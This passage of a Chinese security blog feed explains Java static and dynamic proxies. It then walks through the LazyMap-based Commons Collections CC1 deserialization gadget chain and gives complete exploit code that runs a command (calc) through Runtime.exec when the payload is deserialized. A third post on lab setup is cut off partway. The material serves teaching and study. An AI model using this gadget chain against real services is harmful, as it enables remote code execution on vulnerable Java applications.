    <content type="html"><![CDATA[<h1 id="java反序列化-JDK动态代理"><a href="#java反序列化-JDK动态代理" class="headerlink" title="java反序列化-JDK动态代理"></a>java反序列化-JDK动态代理</h1><h2 id="java代理模式"><a href="#java代理模式" class="headerlink" title="java代理模式"></a>java代理模式</h2><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>java静态代理大概分为如下步骤：</p><ul><li>定义业务接口；</li><li>被代理类实现业务接口；</li><li>定义代理类并实现业务接口；</li><li>最后便可通过客户端进行调用，也就是一个main的启动器。</li></ul><h4 id="业务接口："><a href="#业务接口：" class="headerlink" title="业务接口："></a>业务接口：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.StaticProxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="被代理类实现业务接口："><a href="#被代理类实现业务接口：" class="headerlink" title="被代理类实现业务接口："></a>被代理类实现业务接口：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.StaticProxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;insert into database : &quot;</span>+name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="定义代理类并实现业务接口"><a href="#定义代理类并实现业务接口" class="headerlink" title="定义代理类并实现业务接口"></a>定义代理类并实现业务接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.StaticProxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;<br>    <span class="hljs-keyword">private</span> UserService userService;<span class="hljs-comment">//被代理对象</span><br>    <br>    <span class="hljs-comment">//构造方法传入被代理对象</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserServiceProxy</span><span class="hljs-params">(UserService userService)</span>&#123;<br>        <span class="hljs-built_in">this</span>.userService = userService;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;prepare to insert &quot;</span>);<br>        userService.add(name);<br>        System.out.println(<span class="hljs-string">&quot;insert finished&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="main启动器"><a href="#main启动器" class="headerlink" title="main启动器"></a>main启动器</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.StaticProxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProxy</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-type">UserServiceProxy</span> <span class="hljs-variable">userServiceProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>(userService);<br>        userServiceProxy.add(<span class="hljs-string">&quot;test&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现结果如下：</p><p><img src="/2023/04/27/file-upload/image-20230925165618835.png" alt="image-20230925165618835"></p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>静态代理在代理类和被代理类实现了相同的接口，导致代码的重复，也使得效率大大降低，因此出现了动态代理。</p><p><strong>动态代理在程序运行期间根据需要动态创建代理类及其实例来完成具体的功能</strong></p><p>其实现大概分为如下几步：</p><ul><li>创建被代理的接口和类；</li><li>创建InvocationHandler接口的实现类，在invoke方法中实现代理逻辑；</li><li>通过Proxy的静态方法<code>newProxyInstance( ClassLoaderloader, Class[] interfaces, InvocationHandler h)</code>创建一个代理对象</li><li>使用代理对象</li></ul><p>接下来使用动态代理实现上面的功能。</p><h4 id="被代理的接口和类"><a href="#被代理的接口和类" class="headerlink" title="被代理的接口和类"></a>被代理的接口和类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.DynamicProxy;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.DynamicProxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;insert into database : &quot;</span>+name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="创建InvocationHandler接口的实现类，在invoke方法中实现逻辑"><a href="#创建InvocationHandler接口的实现类，在invoke方法中实现逻辑" class="headerlink" title="创建InvocationHandler接口的实现类，在invoke方法中实现逻辑"></a>创建InvocationHandler接口的实现类，在invoke方法中实现逻辑</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.DynamicProxy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object target;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyInvocationHandler</span><span class="hljs-params">(Object target)</span>&#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;prepare to insert&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> method.invoke(target,args);<br>        System.out.println(<span class="hljs-string">&quot;insert finished&quot;</span>);<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>静态代理中核心部分功能在invoke方法中进行了实现。</p><h4 id="通过Proxy的静态方法newProxyInstance-ClassLoaderloader-Class-interfaces-InvocationHandler-h-创建一个代理对象并使用该代理对象"><a href="#通过Proxy的静态方法newProxyInstance-ClassLoaderloader-Class-interfaces-InvocationHandler-h-创建一个代理对象并使用该代理对象" class="headerlink" title="通过Proxy的静态方法newProxyInstance( ClassLoaderloader, Class[] interfaces, InvocationHandler h)创建一个代理对象并使用该代理对象"></a>通过Proxy的静态方法<code>newProxyInstance( ClassLoaderloader, Class[] interfaces, InvocationHandler h)</code>创建一个代理对象并使用该代理对象</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.DynamicProxy;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-type">MyInvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyInvocationHandler</span>(target);<br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxyObject</span> <span class="hljs-operator">=</span> (UserService) Proxy.newProxyInstance(target.getClass().getClassLoader(),target.getClass().getInterfaces(),handler);<br>        proxyObject.add(<span class="hljs-string">&quot;dynamic test&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/image-20230926093138959.png" alt="image-20230926093138959"></p><p>这里首先是一个真实的实现类，接着实例化一个代理角色，并且设置要代理的对象，即target，最后调用add方法。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化CommonsCollections-CC1链(下)</title>
    <link href="/2024/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections-CC1%E9%93%BE(%E4%B8%8B)/"/>
    <url>/2024/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections-CC1%E9%93%BE(%E4%B8%8B)/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化CommonsCollections-CC1链-下"><a href="#Java反序列化CommonsCollections-CC1链-下" class="headerlink" title="Java反序列化CommonsCollections-CC1链(下)"></a>Java反序列化CommonsCollections-CC1链(下)</h1><h2 id="LazyMap版CC1链分析"><a href="#LazyMap版CC1链分析" class="headerlink" title="LazyMap版CC1链分析"></a>LazyMap版CC1链分析</h2><h3 id="寻找链尾"><a href="#寻找链尾" class="headerlink" title="寻找链尾"></a>寻找链尾</h3><p>还是从InvokerTransformer中的transform方法看起，findusage：</p><p><img src="/2023/04/27/file-upload/20231013165933662.png" alt="image-20231013165933662"></p><p>看到LazyMap类中存在一个public的get方法，里面factory调用了transform。</p><h3 id="寻找完整链子"><a href="#寻找完整链子" class="headerlink" title="寻找完整链子"></a>寻找完整链子</h3><p>往上看看factory在哪里定义：</p><p><img src="/2023/04/27/file-upload/20231013170227422.png" alt="image-20231013170227422"></p><p>这里看到decorate方法，跟TransformMap利用链中的一样，接下来尝试由此开始编写简单的EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.javafx.collections.MappingChange;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Objects;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        Map&lt;Objects,Objects&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map,invokerTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span>c.getDeclaredMethod(<span class="hljs-string">&quot;get&quot;</span>, Object.class);<br>        method.invoke(decorateMap,runtime);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231013152309515.png" alt="image-20231013152309515"></p><p>成功执行命令。</p><p>这里继续找找LazyMap中get方法的调用：</p><p><img src="/2023/04/27/file-upload/20231013162122202.png" alt="image-20231013162122202"></p><p>发现在AnnotationInvocationHandler中的invoke方法里也用到了get方法，并且该类中还有readObject，可以作为入口类。</p><h2 id="手写EXP"><a href="#手写EXP" class="headerlink" title="手写EXP"></a>手写EXP</h2><p>现在的目的是触发AnnotationInvocationHandler.invoke()，立刻想到动态代理。</p><p>如果一个类被动态代理了，要通过代理调用该类的方法，就必须使用到这里的invoke方法。</p><p>在 AnnotationinvocationHandler类下，因为 this.memberValues 可控(在实例化时传入)， 而且在该类的 readObject函数中，也调用了</p><p>memberValues。所以可以利用反射，将生成的代理类赋值给 memberValues。当调用代理对象的方法时，就会执行invoke()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()<br>        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);<br><br>        serialize(invocationHandler);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231016141036766.png" alt="image-20231016141036766"></p><p>被代理的实例为：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Class</span> c = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor declaredConstructor = c.getDeclaredConstructor(<span class="hljs-keyword">Class</span>.<span class="hljs-keyword">class</span>, Map.<span class="hljs-keyword">class</span>);<br>declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.<span class="hljs-keyword">class</span>, decorateMap);<br></code></pre></td></tr></table></figure><h2 id="利用路径"><a href="#利用路径" class="headerlink" title="利用路径"></a>利用路径</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">InvokeTransformer<span class="hljs-meta">#transform</span><br>LazyMap<span class="hljs-meta">#get</span><br>AnnotationInvocationHandler<span class="hljs-meta">#readObject</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>CC1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化CommonsCollections-CC1链(上)</title>
    <link href="/2024/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections-CC1%E9%93%BE(%E4%B8%8A)/"/>
    <url>/2024/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections-CC1%E9%93%BE(%E4%B8%8A)/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化CommonsCollections-CC1链-上"><a href="#Java反序列化CommonsCollections-CC1链-上" class="headerlink" title="Java反序列化CommonsCollections-CC1链(上)"></a>Java反序列化CommonsCollections-CC1链(上)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先新建一个project，选择maven：</p><p><img src="/2023/04/27/file-upload/20231007171306067.png" alt="image-20231007171306067"></p><p>注意jdk为8u65，高版本无法复现，已修复。下载地址：<a href="https://blog.lupf.cn/category/jdkdl">https://blog.lupf.cn/category/jdkdl</a></p><p>添加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>添加之后clean，再install：</p><p><img src="/2023/04/27/file-upload/20231007173651838.png" alt="image-20231007173651838"></p><p>最后load maven changes即可。</p><p>验证是否成功只需要<code>import org.apache.commons.collections.functors.InvokerTransformer;</code>即可：</p><p><img src="/2023/04/27/file-upload/20231007173741551.png" alt="image-20231007173741551"></p><p>不报错就配置完成。</p><p>下载的源码是未开源的，编译器反编译的class会影响调试，因此通过下面的方法查看.java文件。</p><p>到<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4%E4%B8%8B%E8%BD%BDzip%E6%96%87%E4%BB%B6%EF%BC%8C%E8%A7%A3%E5%8E%8B%E5%90%8E%EF%BC%8C%E5%B0%86jdk-af660750b2f4/src/share/classes/sun%E6%96%87%E4%BB%B6%E5%A4%B9%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E5%A4%8D%E5%88%B6%E5%88%B0jdk8u65%E7%9A%84jdk1.8.0_65/src/sun%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%8D%B3%E5%8F%AF%E3%80%82">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4下载zip文件，解压后，将jdk-af660750b2f4\src\share\classes\sun文件夹的内容，复制到jdk8u65的jdk1.8.0_65\src\sun目录下即可。</a></p><h2 id="CommonsCollections介绍"><a href="#CommonsCollections介绍" class="headerlink" title="CommonsCollections介绍"></a>CommonsCollections介绍</h2><p><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p><p><a href="http://commons.apache.org/proper/commons-collections/">Commons Collections</a>包为Java标准的<code>Collections API</code>提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p><ul><li><code>org.apache.commons.collections</code> – CommonsCollections自定义的一组公用的接口和工具类</li><li><code>org.apache.commons.collections.bag</code> – 实现Bag接口的一组类</li><li><code>org.apache.commons.collections.bidimap</code> – 实现BidiMap系列接口的一组类</li><li><code>org.apache.commons.collections.buffer</code> – 实现Buffer接口的一组类</li><li><code>org.apache.commons.collections.collection</code> –实现java.util.Collection接口的一组类</li><li><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</li><li><code>org.apache.commons.collections.functors</code> –Commons Collections自定义的一组功能类</li><li><code>org.apache.commons.collections.iterators</code> – 